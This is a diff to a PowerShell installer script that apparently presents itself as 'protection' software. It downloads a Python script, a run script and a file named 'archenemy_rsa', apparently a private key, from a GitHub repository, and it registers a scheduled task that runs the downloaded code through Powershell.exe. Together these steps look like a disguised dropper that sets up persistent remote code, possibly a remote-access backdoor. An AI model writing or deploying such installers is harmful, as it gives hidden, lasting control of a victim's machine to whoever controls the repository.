@@ -46,7 +46,7 @@ if (-not (Test-Path -Path $outDirectory)) {
 $repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 $runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
 $requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
-$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"
+$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/archenemy_rsa"
 
 $scriptPath = "${outDirectory}/protection.py"
 $runPath = "${outDirectory}/run_protection.ps1"
@@ -96,7 +96,6 @@ if ($scheduledTask) {
 
 
 # Define the action
-#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\Schedule\run_protection.ps1'
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "$runPath"
 
 # Define triggers
